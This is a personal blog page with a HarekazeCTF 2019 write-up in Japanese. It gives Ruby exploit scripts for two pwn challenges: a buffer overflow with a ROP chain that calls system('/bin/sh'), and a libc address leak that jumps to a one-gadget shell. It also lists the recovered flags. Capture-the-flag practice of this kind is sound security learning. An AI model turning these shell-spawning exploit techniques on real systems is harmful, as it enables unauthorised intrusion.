






<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    
    HarekazeCTF 2019 writeup | $ make life
    
  </title>
  
  
  <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=">
  
  <meta name="generator" content="Hugo 0.54.0" />
</head>
<body>
  <nav class="u-background">
  <div class="u-wrapper">
    <ul class="Banner">
      <li class="Banner-item Banner-item--title">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/">$ make life</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/about/">About</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/post/">Posts</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/tags/">Tags</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/categories/">Categories</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/index.xml">RSS</a>
      </li>
      
    </ul>
  </div>
</nav>
  <main>
    <div class="u-wrapper">
      <div class="u-padding">
        

<article>
  <header class="Heading">
  <h2 class="Heading-title">
    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/harekazectf2019/" rel="bookmark">HarekazeCTF 2019 writeup</a>
  </h2>
  
  <time datetime="2019-05-19T16:54:53&#43;09:00">
    19 May, 2019
  </time>
  
</header>
  

<h2 id="baby-rop-1">Baby ROP 1</h2>

<ul>
<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;problem.harekaze.com&#34;</span>, <span style="color:#666">20001</span>

pop_rdi_ret <span style="color:#666">=</span> p64(<span style="color:#666">0x00400683</span>)
<span style="color:#008000">system</span> <span style="color:#666">=</span> p64(<span style="color:#666">0x4005e3</span>)

<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">24</span>
payload <span style="color:#666">&lt;&lt;</span> pop_rdi_ret
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x601048</span>)
payload <span style="color:#666">&lt;&lt;</span> <span style="color:#008000">system</span>

z<span style="color:#666">.</span>sendline payload

z<span style="color:#666">.</span>interact</code></pre></div>
<ul>
<li><strong>HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}</strong></li>
</ul>

<h2 id="baby-rop-2">Baby ROP 2</h2>

<ul>
<li><code>system</code> 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ</li>
</ul>
<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>

<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>

context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;problem.harekaze.com&#34;</span>, <span style="color:#666">20005</span>
<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 9999</span>
elf <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./babyrop2&#34;</span>
libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc.so.6&#34;</span>
<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;./mylibc.so.6&#34;</span>

pop_rdi_ret <span style="color:#666">=</span> p64(<span style="color:#666">0x00400733</span>)
z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>

payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
payload <span style="color:#666">&lt;&lt;</span> pop_rdi_ret
payload <span style="color:#666">&lt;&lt;</span> p64(elf<span style="color:#666">.</span>got<span style="color:#666">[</span><span style="color:#ba2121">&#34;__libc_start_main&#34;</span><span style="color:#666">]</span>)
payload <span style="color:#666">&lt;&lt;</span> p64(<span style="color:#666">0x4004f0</span>)
payload <span style="color:#666">&lt;&lt;</span> p64(elf<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;main&#34;</span><span style="color:#666">]</span>)
<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
z<span style="color:#666">.</span>sendline payload

recvlen <span style="color:#666">=</span> <span style="color:#ba2121">&#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span><span style="color:#666">.</span>length
data <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
<span style="color:#008000">p</span> data
libc_base <span style="color:#666">=</span> u64(data<span style="color:#666">[</span>recvlen, <span style="color:#666">6</span><span style="color:#666">].</span>ljust(<span style="color:#666">8</span>, <span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\x00</span><span style="color:#ba2121">&#34;</span>)) <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;__libc_start_main&#34;</span><span style="color:#666">]</span>
libc_magic <span style="color:#666">=</span> libc_base <span style="color:#666">+</span> <span style="color:#666">0xf02a4</span>
<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;libc base 0x%x&#34;</span> <span style="color:#008000">% libc_base
</span><span style="color:#008000">puts </span> <span style="color:#ba2121">&#34;libc magic 0x%x&#34;</span> <span style="color:#008000">% libc_magic
</span><span style="color:#008000">
</span><span style="color:#008000">payload </span> <span style="color:#666">=</span> <span style="color:#ba2121">&#34;B&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
payload <span style="color:#666">&lt;&lt;</span> p64(libc_magic)
z<span style="color:#666">.</span>sendline payload

z<span style="color:#666">.</span>interact</code></pre></div>
<ul>
<li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
</ul>

<h2 id="login">Login</h2>

<ul>
<li>解けなかった、脆弱性わからず</li>
</ul>

<h2 id="harekaze-note">Harekaze Note</h2>

<ul>
<li>Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず</li>
</ul>

  
</article>


      </div>
    </div>
  </main>
  
<footer class="Footer">
  <div class="u-wrapper">
    <div class="u-padding">
      Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/" rel="license"> Creative Commons Attribution 4.0 International License</a>.
    </div>
  </div>
</footer>

  
</body>
</html>